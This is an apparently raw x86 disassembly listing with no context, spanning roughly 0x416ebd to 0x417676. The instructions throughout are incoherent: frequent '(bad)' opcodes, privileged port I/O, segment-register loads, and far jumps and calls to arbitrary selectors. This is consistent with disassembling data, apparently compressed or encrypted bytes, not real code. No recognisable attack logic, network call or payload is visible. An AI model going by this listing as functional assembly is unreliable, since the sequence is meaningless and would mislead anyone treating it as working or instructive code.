  416ebd:	ja     0x416e78
  416ebf:	mov    dl,0x8d
  416ec1:	or     DWORD PTR [esi-0x672e8313],edx
  416ec7:	mov    dh,0xa6
  416ec9:	xchg   esi,eax
  416eca:	sbb    DWORD PTR [edi+edi*8-0x79dd56c0],edx
  416ed1:	cmp    eax,DWORD PTR [ebx]
  416ed3:	fisttp DWORD PTR [ebp+0xb]
  416ed6:	pop    ebp
  416ed7:	sub    DWORD PTR [ebx-0x5f53dd7a],0x3b
  416ede:	push   ecx
  416edf:	je     0x416f05
  416ee1:	ficomp DWORD PTR [esi]
  416ee3:	mov    ss,edx
  416ee5:	mov    ds:0x583158b4,eax
  416eea:	pushf  
  416eeb:	pop    ds
  416eec:	ins    BYTE PTR es:[edi],dx
  416eed:	push   esp
  416eee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eef:	add    eax,0x166bdc11
  416ef4:	adc    DWORD PTR [eax+0x5d],ecx
  416ef7:	mov    al,0xca
  416ef9:	mov    ah,0xd2
  416efb:	outs   dx,BYTE PTR ds:[esi]
  416efc:	push   ecx
  416efd:	stos   BYTE PTR es:[edi],al
  416efe:	push   0xffffffd6
  416f00:	inc    edx
  416f01:	sbb    al,0x4
  416f03:	lock ins BYTE PTR es:[edi],dx
  416f05:	pop    ds
  416f06:	in     al,0xee
  416f08:	in     eax,0xd4
  416f0a:	dec    esp
  416f0b:	dec    ebp
  416f0c:	adc    al,0xcc
  416f0e:	dec    eax
  416f0f:	pop    esp
  416f10:	es std 
  416f12:	cmp    al,0x85
  416f14:	clc    
  416f15:	cmc    
  416f16:	fsubr  QWORD PTR [ecx]
  416f18:	imul   eax,DWORD PTR [ecx],0xffffffb5
  416f1b:	aad    0xdd
  416f1d:	mov    bl,0x18
  416f1f:	mov    bh,0x7b
  416f21:	jge    0x416f6b
  416f23:	add    eax,0x46e9c7ee
  416f28:	push   ecx
  416f29:	lods   al,BYTE PTR ds:[esi]
  416f2a:	jmp    FWORD PTR [eax]
  416f2c:	scas   eax,DWORD PTR es:[edi]
  416f2d:	push   0x2fc0298e
  416f32:	adc    DWORD PTR [edi-0x5a9f8b7c],ebp
  416f38:	fist   DWORD PTR [esi-0x1c]
  416f3b:	inc    edx
  416f3c:	ins    BYTE PTR es:[edi],dx
  416f3d:	and    al,ah
  416f3f:	fbstp  TBYTE PTR [esi+eax*2+0x1c]
  416f43:	dec    ebp
  416f44:	adc    DWORD PTR [ebx-0x56e9fe39],eax
  416f4a:	out    0x79,al
  416f4c:	sbb    DWORD PTR [edi],ebx
  416f4e:	push   edi
  416f4f:	xchg   esi,eax
  416f50:	fisub  WORD PTR [esp+eiz*2]
  416f53:	dec    eax
  416f54:	mov    BYTE PTR [ecx-0x768c661f],bl
  416f5a:	aam    0xa1
  416f5c:	jg     0x416f91
  416f5e:	mov    ebx,0x5451bf53
  416f63:	idiv   DWORD PTR [ebp+0x51]
  416f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f67:	mov    esp,0xeeda212b
  416f6c:	inc    eax
  416f6d:	mov    al,0x14
  416f6f:	sar    edx,0x8
  416f72:	or     al,BYTE PTR [edx-0xe1fc9a]
  416f78:	adc    DWORD PTR [ecx-0xd],ebp
  416f7b:	pop    ds
  416f7c:	mov    dh,0x26
  416f7e:	dec    ebx
  416f7f:	jge    0x416f6d
  416f81:	jbe    0x416fab
  416f83:	jp     0x416f51
  416f85:	push   esp
  416f86:	mov    edi,0xfe9be027
  416f8b:	xor    ecx,esi
  416f8d:	imul   ebx,eax,0x2e3c19f4
  416f93:	les    edi,FWORD PTR [edx+0x51]
  416f96:	lea    ecx,[eax+0x63]
  416f99:	daa    
  416f9a:	fstp   TBYTE PTR [ebx]
  416f9c:	sbb    DWORD PTR [esi],ebp
  416f9e:	je     0x416f3f
  416fa0:	or     BYTE PTR [eax+0x1a],0x7b
  416fa4:	aam    0x91
  416fa6:	mov    ch,0xcd
  416fa8:	dec    ebx
  416fa9:	xor    ebp,ebp
  416fab:	(bad)  
  416fac:	xor    edx,edi
  416fae:	jg     0x416f70
  416fb0:	sub    ch,BYTE PTR [edi+0x59]
  416fb3:	jmp    0xdf2d:0xbd9ecd5a
  416fba:	mov    esi,0xc677ff91
  416fbf:	test   BYTE PTR [eax],bh
  416fc1:	retf   
  416fc2:	cmp    al,0x69
  416fc4:	mov    eax,ds:0xd94bf168
  416fc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fca:	inc    ebx
  416fcb:	inc    ecx
  416fcc:	int3   
  416fcd:	je     0x416f6d
  416fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fd0:	jno    0x417028
  416fd2:	jno    0x416f96
  416fd4:	(bad)  
  416fd5:	pop    esi
  416fd6:	(bad)  
  416fd7:	or     BYTE PTR [edx-0x7f3fab89],al
  416fdd:	inc    eax
  416fde:	add    al,0x4c
  416fe0:	out    0x6b,al
  416fe2:	xor    ebx,DWORD PTR [esi+0x4bb746d2]
  416fe8:	test   DWORD PTR [eax],ebp
  416fea:	out    dx,eax
  416feb:	push   ecx
  416fec:	mov    edx,0xc85de0b0
  416ff1:	(bad)  
  416ff2:	cmp    ecx,esi
  416ff4:	outs   dx,BYTE PTR ds:[esi]
  416ff5:	push   0x3d
  416ff7:	ins    BYTE PTR es:[edi],dx
  416ff8:	pop    eax
  416ff9:	or     DWORD PTR [edi+0x5bfaa2cc],ebx
  416fff:	push   cs
  417000:	sbb    DWORD PTR [esi+edx*2-0x50],ecx
  417004:	push   eax
  417005:	sbb    BYTE PTR [ebp+0x9066ab3],0xb8
  41700c:	add    eax,0x46fab557
  417011:	mov    ebx,0x777a8350
  417017:	mov    esi,0x9fe11511
  41701c:	mov    ch,0x13
  41701e:	mov    al,ds:0x5138a45b
  417023:	inc    edx
  417024:	fild   DWORD PTR [edi-0x21]
  417027:	xchg   ebx,eax
  417028:	sbb    BYTE PTR [eax],ah
  41702a:	lahf   
  41702b:	sub    BYTE PTR [edi],ch
  41702d:	jo     0x416fe4
  41702f:	lea    ebp,[ebp+0x4a]
  417032:	jmp    0x41708c
  417034:	pusha  
  417035:	mov    dl,BYTE PTR [edi-0x6715b93d]
  41703b:	outs   dx,BYTE PTR ds:[esi]
  41703c:	stos   BYTE PTR es:[edi],al
  41703d:	cmp    al,0x58
  41703f:	pop    edi
  417040:	jno    0x4170a3
  417042:	sub    ebx,DWORD PTR [ecx-0x7bd170e3]
  417048:	push   0x10
  41704a:	pop    eax
  41704b:	mov    esi,0x32ae4136
  417050:	sub    dh,BYTE PTR [ebx+edx*1-0x397eabbc]
  417057:	fscale 
  417059:	ret    
  41705a:	dec    ebp
  41705b:	cmp    ebp,DWORD PTR [edx-0x1a9f4115]
  417061:	xchg   DWORD PTR [esi+0x4f],esi
  417064:	hlt    
  417065:	mov    al,ds:0x43cfe759
  41706a:	outs   dx,BYTE PTR ds:[esi]
  41706b:	mov    al,ds:0x1aeaccc6
  417070:	pushf  
  417071:	dec    ebp
  417072:	shr    edi,1
  417074:	arpl   WORD PTR [ebx-0x48],di
  417077:	mov    cl,0xf0
  417079:	fmul   DWORD PTR [ecx+0x6716a56]
  41707f:	aam    0xef
  417081:	jge    0x4170e7
  417083:	and    eax,0x9a304ebb
  417088:	push   eax
  417089:	push   ebx
  41708a:	xchg   ecx,eax
  41708b:	data16 adc BYTE PTR [ecx-0x80],al
  41708f:	push   cs
  417090:	pop    esp
  417091:	(bad)  
  417092:	jmp    0x92f5:0x86af2d81
  417099:	pop    ds
  41709a:	push   edx
  41709b:	leave  
  41709c:	leave  
  41709d:	adc    dh,BYTE PTR [edx]
  41709f:	inc    esi
  4170a0:	jae    0x41708e
  4170a2:	mov    eax,0x1e3130c9
  4170a7:	daa    
  4170a8:	lock cmc 
  4170aa:	mov    eax,ds:0x46174042
  4170af:	add    al,0xf6
  4170b1:	mov    cl,0x2e
  4170b3:	dec    edi
  4170b4:	pusha  
  4170b5:	mov    dl,0xb7
  4170b7:	jnp    0x4170b3
  4170b9:	mov    edx,0x9fe58709
  4170be:	push   ebx
  4170bf:	adc    esi,DWORD PTR [ebx+0x4a]
  4170c2:	xchg   cx,ax
  4170c4:	stos   BYTE PTR es:[edi],al
  4170c5:	mov    al,ds:0x290b7146
  4170ca:	pop    ecx
  4170cb:	push   eax
  4170cc:	or     ah,BYTE PTR [ecx+0x6d]
  4170cf:	push   ds
  4170d0:	push   eax
  4170d1:	cmp    eax,0x14156eb4
  4170d6:	xchg   ebx,eax
  4170d7:	dec    esi
  4170d8:	fmul   QWORD PTR [eax+0x55]
  4170db:	adc    DWORD PTR [edi-0x17],0x9fdbdee4
  4170e2:	ror    DWORD PTR [edx-0xa],1
  4170e5:	pop    eax
  4170e6:	jmp    0x1430ff8e
  4170eb:	push   ds
  4170ec:	jb     0x41713b
  4170ee:	aad    0x82
  4170f0:	pop    esp
  4170f1:	ss jmp 0x417158
  4170f4:	sbb    ecx,DWORD PTR [eax]
  4170f6:	stos   DWORD PTR es:[edi],eax
  4170f7:	in     eax,dx
  4170f8:	inc    eax
  4170f9:	out    dx,eax
  4170fa:	je     0x4170dc
  4170fc:	and    al,0x49
  4170fe:	mov    BYTE PTR [edi-0x2e753033],al
  417104:	pop    edx
  417105:	fs pop ss
  417107:	jp     0x417105
  417109:	sub    al,0xf7
  41710b:	je     0x417176
  41710d:	je     0x417105
  41710f:	push   ss
  417110:	cmc    
  417111:	sbb    ebx,eax
  417113:	jge    0x41715e
  417115:	imul   ecx,DWORD PTR [edi+esi*2-0xf],0xffffffd1
  41711a:	mov    bl,0x99
  41711c:	dec    ebx
  41711d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41711e:	pop    ds
  41711f:	add    al,dh
  417121:	ret    
  417122:	and    DWORD PTR [eax+edx*2],ebx
  417125:	imul   BYTE PTR [ebx+0x67c0b5fb]
  41712b:	inc    esi
  41712c:	ss push esi
  41712e:	scas   eax,DWORD PTR es:[edi]
  41712f:	pop    ds
  417130:	aas    
  417131:	sub    al,0x22
  417133:	sub    eax,0xd496928a
  417138:	and    DWORD PTR [eax-0x50],esp
  41713b:	outs   dx,BYTE PTR ds:[esi]
  41713c:	test   BYTE PTR [edi+0xff9b227],0x9d
  417143:	jg     0x4170ec
  417145:	push   ss
  417146:	call   0xcc2c:0xdd14c081
  41714d:	pop    edi
  41714e:	cld    
  41714f:	loop   0x4171ce
  417151:	xchg   DWORD PTR [ebx+edx*2-0x5c80062e],edi
  417158:	xchg   esp,eax
  417159:	pslld  mm6,mm7
  41715c:	(bad)  
  41715d:	mov    ecx,0x64e65a1b
  417162:	out    dx,al
  417163:	sbb    BYTE PTR [edi],dh
  417165:	ins    BYTE PTR es:[edi],dx
  417166:	xchg   ecx,eax
  417167:	cmp    DWORD PTR [edi-0x23b3ad69],ebp
  41716d:	jmp    0x834e:0x443e6452
  417174:	out    dx,eax
  417175:	jmp    0x417127
  417177:	sbb    al,0x3d
  417179:	dec    esp
  41717a:	xchg   ebx,eax
  41717b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41717c:	xlat   BYTE PTR ds:[ebx]
  41717d:	push   edx
  41717e:	shl    dh,0x21
  417181:	cwde   
  417182:	inc    esi
  417183:	in     al,dx
  417184:	sti    
  417185:	int    0x7b
  417187:	push   edi
  417188:	push   cs
  417189:	xchg   ebp,eax
  41718a:	or     al,0xa9
  41718c:	shl    dh,1
  41718e:	and    eax,0xf7d101d0
  417193:	mov    eax,ds:0xbd1e9d5b
  417198:	pop    esi
  417199:	adc    eax,DWORD PTR [ecx]
  41719b:	fimul  WORD PTR [eax]
  41719d:	sub    edx,ebx
  41719f:	xchg   ebx,eax
  4171a0:	leave  
  4171a1:	dec    eax
  4171a2:	js     0x4171f6
  4171a4:	mov    ebp,DWORD PTR [eax]
  4171a6:	je     0x41718d
  4171a8:	dec    eax
  4171a9:	jmp    0xb54ebb64
  4171ae:	imul   edi,DWORD PTR [esi-0x32],0xb926aba3
  4171b5:	pop    ebx
  4171b6:	cwde   
  4171b7:	mov    ah,0x31
  4171b9:	scas   al,BYTE PTR es:[edi]
  4171ba:	fcomp  DWORD PTR [edx+0x55d8535b]
  4171c0:	and    BYTE PTR [eax+0x52958326],bh
  4171c6:	push   ds
  4171c7:	stc    
  4171c8:	sub    ecx,DWORD PTR [ebp-0x45]
  4171cb:	inc    edx
  4171cc:	std    
  4171cd:	mov    ds,WORD PTR [ebx+0x7c]
  4171d0:	call   DWORD PTR [edx+ecx*2-0x18]
  4171d4:	ficomp WORD PTR [eax-0x8ef97e2]
  4171da:	scas   eax,DWORD PTR es:[edi]
  4171db:	lea    ebp,[edx+0xa]
  4171de:	mov    ecx,0xa39e76c6
  4171e3:	rol    BYTE PTR [edi+eax*8+0x4b],cl
  4171e7:	xchg   ebp,eax
  4171e8:	rcl    BYTE PTR [ecx+esi*1],cl
  4171eb:	dec    esp
  4171ec:	cmp    BYTE PTR ds:0x9ea9574d,ah
  4171f2:	test   ecx,ebx
  4171f4:	bound  edx,QWORD PTR [esi+eiz*8]
  4171f7:	stos   DWORD PTR es:[di],eax
  4171f9:	mov    dh,0xc2
  4171fb:	imul   esp,DWORD PTR [ebx-0x1d510f4f],0xffffffe4
  417202:	mov    cs,WORD PTR [esi]
  417204:	and    cl,BYTE PTR [edx-0x46]
  417207:	sbb    BYTE PTR [ebx+0x59aaee26],ch
  41720d:	test   BYTE PTR [esi-0x5f],dh
  417210:	popa   
  417211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417212:	pushf  
  417213:	rcl    DWORD PTR [ebp-0x3214d7a7],0xa6
  41721a:	test   al,0x57
  41721c:	mov    bl,0x6
  41721e:	aas    
  41721f:	jb     0x4171f0
  417221:	rol    DWORD PTR [edx+0x3b],cl
  417224:	shl    BYTE PTR [esi+0x676e0fc0],0x25
  41722b:	ins    BYTE PTR es:[edi],dx
  41722c:	mov    ds:0x45ac08f0,eax
  417231:	std    
  417232:	add    BYTE PTR ss:[edi],dh
  417235:	ss cmp eax,0xc00f735b
  41723b:	dec    esp
  41723c:	cmp    dl,bl
  41723e:	imul   ecx,DWORD PTR [eax-0x2],0xffffff9c
  417242:	xchg   DWORD PTR ss:[edx],edi
  417245:	pop    edi
  417246:	jb     0x4171e7
  417248:	aaa    
  417249:	cld    
  41724a:	rcl    BYTE PTR [ebx+eiz*2-0x1b],cl
  41724e:	retf   
  41724f:	shl    DWORD PTR [eax-0x23],1
  417252:	fsubr  QWORD PTR [ebp+0xf38cf55]
  417258:	cmp    eax,0xd2706e8f
  41725d:	adc    eax,DWORD PTR [ebx+0xc]
  417260:	xchg   edi,eax
  417261:	mov    cl,0x92
  417263:	fwait
  417264:	dec    ebx
  417265:	sbb    BYTE PTR [edx],al
  417267:	out    dx,al
  417268:	imul   eax,DWORD PTR [ebp-0x3ed4663f],0x24
  41726f:	jecxz  0x4172e8
  417271:	inc    esi
  417272:	fidivr WORD PTR ds:0x8ab29a6a
  417278:	jge    0x41723a
  41727a:	jge    0x41722f
  41727c:	pop    ebx
  41727d:	adc    BYTE PTR [eax+0x61f94eb7],bh
  417283:	mov    dh,0xbd
  417285:	sbb    al,ah
  417287:	outs   dx,BYTE PTR ds:[esi]
  417288:	pop    esp
  417289:	inc    ecx
  41728a:	sbb    eax,0xc143c81f
  41728f:	adc    al,0xba
  417291:	int    0xde
  417293:	jle    0x417295
  417295:	sbb    al,0xc9
  417297:	(bad)  
  417298:	sub    DWORD PTR ds:0x94a19ff3,ecx
  41729e:	xor    al,0xc6
  4172a0:	in     al,dx
  4172a1:	add    al,0xdb
  4172a3:	and    esi,edx
  4172a5:	ror    BYTE PTR [edx-0x657d39d3],1
  4172ab:	dec    esi
  4172ac:	mov    dh,0x54
  4172ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172af:	jne    0x417291
  4172b1:	pop    esp
  4172b2:	imul   edx,DWORD PTR [ebx-0x14],0x20fdc43e
  4172b9:	xchg   ebp,eax
  4172ba:	sbb    DWORD PTR [esi+0x2b],0xd982b1c2
  4172c1:	ret    0x5480
  4172c4:	or     ecx,ebx
  4172c6:	ins    BYTE PTR es:[edi],dx
  4172c7:	jbe    0x417254
  4172c9:	or     eax,0x22e3df48
  4172ce:	fcmovu st,st(3)
  4172d0:	aam    0x88
  4172d2:	fldcw  WORD PTR [ebx+0x7090b489]
  4172d8:	xor    BYTE PTR [eax],bl
  4172da:	ja     0x4172a1
  4172dc:	cmp    dh,BYTE PTR [ebx+0x54]
  4172df:	add    esi,DWORD PTR [ebx-0x1fd591d4]
  4172e5:	push   es
  4172e6:	jle    0x41735c
  4172e8:	adc    DWORD PTR [ecx],0xffffff90
  4172eb:	push   ecx
  4172ec:	cli    
  4172ed:	lock aad 0x5b
  4172f0:	pop    ecx
  4172f1:	inc    ebx
  4172f2:	aas    
  4172f3:	test   al,0x14
  4172f5:	stos   DWORD PTR es:[edi],eax
  4172f6:	mov    ah,0x83
  4172f8:	loop   0x417319
  4172fa:	(bad)  
  4172fb:	mov    bl,0x40
  4172fd:	sub    BYTE PTR [esi],cl
  4172ff:	push   ebp
  417300:	ficomp WORD PTR [ebx+0x2d]
  417303:	iret   
  417304:	fwait
  417305:	cdq    
  417306:	push   ebp
  417307:	jle    0x4172df
  417309:	shr    DWORD PTR [edi+edi*2-0x5178b21c],cl
  417310:	fld    QWORD PTR [ebx-0x61]
  417313:	retf   0x3e17
  417316:	xor    al,cl
  417318:	jmp    0xcdf6:0x7273a348
  41731f:	psubd  mm5,QWORD PTR ds:0x5305244d
  417326:	lods   al,BYTE PTR ds:[esi]
  417327:	rcl    ah,cl
  417329:	sub    BYTE PTR [eax-0x4c],ch
  41732c:	push   ecx
  41732d:	mov    ebx,0xb26b01b9
  417332:	sbb    eax,0xe1322f97
  417337:	add    ah,BYTE PTR [edx-0x7445a1cc]
  41733d:	or     eax,0x17e157bd
  417342:	loope  0x4172ea
  417344:	arpl   bp,cx
  417346:	xor    BYTE PTR [eax+ecx*4-0x21e29bbc],bl
  41734d:	test   al,0x33
  41734f:	push   edi
  417350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417351:	iret   
  417352:	int    0xa3
  417354:	jmp    0x28bb:0x679e57ab
  41735b:	xor    al,0x64
  41735d:	stc    
  41735e:	sbb    bl,dl
  417360:	and    DWORD PTR [esi+0x793fea5c],0xffffffd7
  417367:	test   BYTE PTR [ebp-0x7f],al
  41736a:	mov    edi,0x76e96393
  41736f:	je     0x4173b9
  417371:	sub    al,BYTE PTR [ecx-0x76c84d99]
  417377:	sub    cl,0xc0
  41737a:	add    ecx,ebp
  41737c:	stos   BYTE PTR es:[edi],al
  41737d:	daa    
  41737e:	scas   al,BYTE PTR es:[edi]
  41737f:	imul   ebx,DWORD PTR [edx],0x84e3cb9d
  417385:	iret   
  417386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417387:	mov    ecx,0x9cbc3b26
  41738d:	push   edi
  41738e:	mov    DWORD PTR [edx+0x27440abe],edx
  417394:	inc    esi
  417395:	pusha  
  417396:	mov    ecx,0xf6d3fbb7
  41739b:	mov    ds:0x8373c85d,eax
  4173a0:	scas   eax,DWORD PTR es:[edi]
  4173a1:	add    DWORD PTR [ebx],ebp
  4173a3:	dec    edx
  4173a4:	lods   al,BYTE PTR ds:[esi]
  4173a5:	(bad)  
  4173a6:	adc    ecx,DWORD PTR [eax]
  4173a8:	popf   
  4173a9:	(bad)  
  4173aa:	fisubr DWORD PTR [ebx+0x4c9953c1]
  4173b0:	sub    bl,BYTE PTR [edi-0x17]
  4173b3:	cld    
  4173b4:	and    eax,0x355e9430
  4173b9:	mov    al,ds:0xeb8d6588
  4173be:	pop    ecx
  4173bf:	mov    al,BYTE PTR [ebx+0x38704c02]
  4173c5:	jmp    0x6c0e10c1
  4173ca:	mov    al,ds:0x9ff1fced
  4173cf:	sbb    esi,eax
  4173d1:	data16 aas 
  4173d3:	addr16 mov al,ds:0x8930
  4173d7:	sbb    BYTE PTR [edx+0x7c],0xc2
  4173db:	mov    al,0x5
  4173dd:	bound  eax,QWORD PTR [eax]
  4173df:	stc    
  4173e0:	or     ch,0x9c
  4173e3:	push   0xa19422ba
  4173e8:	add    al,0x6a
  4173ea:	test   BYTE PTR gs:[ebx+0x43],al
  4173ee:	hlt    
  4173ef:	mov    edi,ebx
  4173f1:	lahf   
  4173f2:	test   al,0xdb
  4173f4:	mov    dh,0xc9
  4173f6:	out    0xac,al
  4173f8:	dec    eax
  4173f9:	jecxz  0x4173f3
  4173fb:	xchg   ebp,eax
  4173fc:	ja     0x4173f5
  4173fe:	in     eax,dx
  4173ff:	rol    BYTE PTR [esi],cl
  417401:	jp     0x4173db
  417403:	dec    esi
  417404:	sahf   
  417405:	out    0xfe,eax
  417407:	shl    cl,1
  417409:	push   edi
  41740a:	call   0x31137ab1
  41740f:	adc    esp,eax
  417411:	fstp   DWORD PTR [ecx]
  417413:	pushf  
  417414:	mov    ecx,DWORD PTR [ebp+0x27d57b11]
  41741a:	lods   al,BYTE PTR ds:[esi]
  41741b:	stos   BYTE PTR es:[edi],al
  41741c:	adc    DWORD PTR [edi*8+0x58c2e64e],0xd
  417424:	or     ebx,DWORD PTR [edx+0x2627c5e1]
  41742a:	fadd   QWORD PTR [edi+0xb]
  41742d:	sub    BYTE PTR [eax],al
  41742f:	(bad)  
  417430:	mov    WORD PTR [ecx-0x79c69373],ds
  417436:	push   0x2d
  417438:	push   ebx
  417439:	jb     0x4173d9
  41743b:	push   edx
  41743c:	mov    ah,0x84
  41743e:	or     al,0x80
  417440:	pop    ds
  417441:	retf   0x603
  417444:	xchg   BYTE PTR [ecx-0x61ccd3a0],bl
  41744a:	ins    DWORD PTR es:[edi],dx
  41744b:	pop    eax
  41744c:	pop    es
  41744d:	or     DWORD PTR [edi-0x446810d7],edi
  417453:	dec    ebp
  417454:	xor    DWORD PTR [esi+0x31],ebx
  417457:	ss call 0x19d9:0x267f2b34
  41745f:	fnsave [esi+0x4b7c0d36]
  417465:	push   edx
  417466:	test   al,0x2f
  417468:	pop    esi
  417469:	icebp  
  41746a:	xchg   edx,eax
  41746b:	pop    edx
  41746c:	(bad)  
  41746d:	cmp    DWORD PTR [eax*4+0x385c9102],ebp
  417474:	(bad)  
  417475:	gs inc eax
  417477:	das    
  417478:	adc    cl,al
  41747a:	into   
  41747b:	mov    eax,edi
  41747d:	dec    esp
  41747e:	gs jg  0x417500
  417481:	cmp    DWORD PTR [ebx],eax
  417483:	shl    dh,1
  417485:	es aas 
  417487:	jge    0x41745f
  417489:	xchg   edi,eax
  41748a:	jbe    0x4174b3
  41748c:	in     eax,dx
  41748d:	scas   eax,DWORD PTR es:[edi]
  41748e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41748f:	retf   
  417490:	(bad)  
  417491:	retf   0x46b9
  417494:	add    DWORD PTR [edx],esi
  417496:	sub    al,BYTE PTR [esi+0x31be7401]
  41749c:	cwde   
  41749d:	lahf   
  41749e:	sub    bh,ch
  4174a0:	retf   0xf504
  4174a3:	nop
  4174a4:	inc    ebp
  4174a5:	xchg   edx,eax
  4174a6:	retf   
  4174a7:	mov    dl,0xa6
  4174a9:	mov    edx,0x2204d23e
  4174ae:	fmul   QWORD PTR ds:0x23e79a53
  4174b4:	test   al,ch
  4174b6:	scas   al,BYTE PTR es:[edi]
  4174b7:	mov    bl,0xae
  4174b9:	test   DWORD PTR [esi+0x109df07c],0x5892c556
  4174c3:	leave  
  4174c4:	or     bl,al
  4174c6:	repz inc ebp
  4174c8:	ins    DWORD PTR es:[edi],dx
  4174c9:	sbb    edx,esi
  4174cb:	call   0x9227:0x1fa89111
  4174d2:	jb     0x4174f9
  4174d4:	fst    QWORD PTR [eax+ebp*2]
  4174d7:	xlat   BYTE PTR ds:[ebx]
  4174d8:	mov    BYTE PTR [ebx-0x2de46bcc],bl
  4174de:	das    
  4174df:	stos   DWORD PTR es:[edi],eax
  4174e0:	xor    eax,0xf75d8f3b
  4174e5:	sbb    eax,0x83429f1e
  4174ea:	(bad)  
  4174ec:	dec    ebp
  4174ed:	push   0x70
  4174ef:	cdq    
  4174f0:	in     al,dx
  4174f1:	jno    0x41748f
  4174f3:	pop    ecx
  4174f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174f5:	aad    0xd
  4174f7:	adc    al,0xfd
  4174f9:	jl     0x417565
  4174fb:	rol    DWORD PTR [esi],0xbd
  4174fe:	sub    DWORD PTR [ecx+0x38],0x34
  417502:	retf   0x7be0
  417505:	ins    DWORD PTR es:[edi],dx
  417506:	or     dl,ch
  417508:	mov    edx,0x64d45d87
  41750d:	dec    esp
  41750e:	loopne 0x417582
  417510:	dec    ebx
  417511:	xchg   edi,eax
  417512:	mov    ds:0x4ab3f2a8,al
  417517:	add    dl,al
  417519:	imul   esi,DWORD PTR [ecx+ebp*1-0x2cabdc4e],0x35
  417521:	mov    edi,DWORD PTR [ebx+ebp*1-0x3145bcd1]
  417528:	test   eax,0xd4e3655b
  41752d:	push   cs
  41752e:	jecxz  0x41756b
  417530:	pop    ebp
  417531:	rol    BYTE PTR [edx+0x4a],1
  417534:	(bad)  
  417535:	neg    DWORD PTR [ecx-0x79]
  417538:	lock adc al,0xbe
  41753b:	clc    
  41753c:	ds jecxz 0x4174ef
  41753f:	leave  
  417540:	and    al,0xd5
  417542:	adc    BYTE PTR [ebp-0x1e3bba7b],dl
  417548:	sbb    BYTE PTR [edi+eiz*4],ah
  41754b:	mov    ch,0x59
  41754d:	push   edx
  41754e:	ss pusha 
  417550:	es sbb al,0xc4
  417553:	cld    
  417554:	jge    0x41751b
  417556:	jbe    0x417537
  417558:	in     al,dx
  417559:	imul   ecx,edx,0x7381b658
  41755f:	not    al
  417561:	push   ebp
  417562:	and    DWORD PTR [ebp-0x12b79983],esp
  417568:	pushf  
  417569:	in     eax,0x4e
  41756b:	and    eax,0xf7563ba4
  417570:	in     al,dx
  417571:	rcl    BYTE PTR [edx],0xf0
  417574:	cmp    BYTE PTR [eax+0x45],0xb5
  417578:	pusha  
  417579:	cs gs adc eax,0x13b37b43
  417580:	sub    DWORD PTR [ebx+0x7d],0xffffff8f
  417584:	cs xchg esi,eax
  417586:	std    
  417587:	nop
  417588:	jbe    0x4175ce
  41758a:	cmp    ebp,DWORD PTR [eax+ebp*4]
  41758d:	mov    al,0x81
  41758f:	out    dx,eax
  417590:	or     ebx,DWORD PTR [eax]
  417592:	push   edx
  417593:	test   eax,0x50c8dd13
  417598:	cmp    al,0x2f
  41759a:	test   DWORD PTR [esi-0x414e9d70],edi
  4175a0:	stos   BYTE PTR es:[edi],al
  4175a1:	mov    bh,0x51
  4175a3:	sub    ebp,0x70
  4175a6:	int    0xe8
  4175a8:	cmp    DWORD PTR [edx],esp
  4175aa:	jg     0x417618
  4175ac:	cmp    al,0xf2
  4175ae:	mov    al,ds:0x44feb829
  4175b3:	xor    DWORD PTR [edx+0x781d345e],esi
  4175b9:	xor    ah,ch
  4175bb:	cli    
  4175bc:	pop    ss
  4175bd:	and    esi,DWORD PTR [ebx-0x3e]
  4175c0:	adc    BYTE PTR [eax],bh
  4175c2:	xchg   ebp,eax
  4175c3:	add    dl,BYTE PTR [eax]
  4175c5:	and    eax,0xb06fabc
  4175ca:	inc    edi
  4175cb:	adc    al,0xfb
  4175cd:	sbb    esp,DWORD PTR [esi-0x20]
  4175d0:	push   ds
  4175d1:	inc    edi
  4175d2:	out    dx,al
  4175d3:	jae    0x4175a2
  4175d5:	repnz arpl WORD PTR [esi+0x1c],bx
  4175d9:	popa   
  4175da:	xchg   ecx,eax
  4175db:	nop
  4175dc:	xor    DWORD PTR [ecx+0x1bf5f04b],ebx
  4175e2:	enter  0xaba7,0x5a
  4175e6:	cmp    ebp,DWORD PTR [ebx+0x1733ac8c]
  4175ec:	push   es
  4175ed:	inc    ebp
  4175ee:	adc    bh,BYTE PTR [edx-0xae4b87a]
  4175f4:	call   0x249:0x12c8ec3b
  4175fb:	dec    ecx
  4175fc:	sti    
  4175fd:	xchg   esi,eax
  4175fe:	dec    edx
  4175ff:	dec    ebp
  417600:	ror    eax,1
  417602:	jmp    0x6e7e:0x4375a987
  417609:	inc    ebx
  41760a:	lock sub cl,BYTE PTR [esi+0x378f1267]
  417611:	nop
  417612:	shl    BYTE PTR [eax-0x10],cl
  417615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417616:	sub    al,0x6e
  417618:	fcomip st,st(3)
  41761a:	ret    0x5acf
  41761d:	inc    edx
  41761e:	addr16 lock popa 
  417621:	cmp    BYTE PTR [edx-0x34],al
  417624:	push   ebp
  417625:	adc    esi,esi
  417627:	stc    
  417628:	jmp    FWORD PTR [esp+edx*2+0x75]
  41762c:	repnz inc edi
  41762e:	ss (bad) 
  417630:	out    dx,eax
  417631:	sbb    DWORD PTR [edi+0x6e],eax
  417634:	loope  0x417600
  417636:	jle    0x4175fa
  417638:	or     al,0x2b
  41763a:	pop    esi
  41763b:	inc    esp
  41763c:	mov    al,ds:0xf43abbc6
  417641:	mov    al,ds:0xea53b399
  417646:	xor    eax,0x87f3060c
  41764b:	mov    eax,DWORD PTR [ebp+0x45e8ebe5]
  417651:	mov    eax,ds:0xf4d335bc
  417656:	add    DWORD PTR [ebx+0x22328c1],0x33fc4568
  417660:	addr16 sbb ch,al
  417663:	or     dh,al
  417665:	inc    edi
  417666:	xor    eax,0xdb30b171
  41766b:	jg     0x4176e0
  41766d:	or     al,BYTE PTR [eax]
  41766f:	xor    al,0x50
  417671:	lea    eax,[esi+0x42]
  417674:	in     al,dx
  417675:	pop    edx
  417676:	pop    ebx
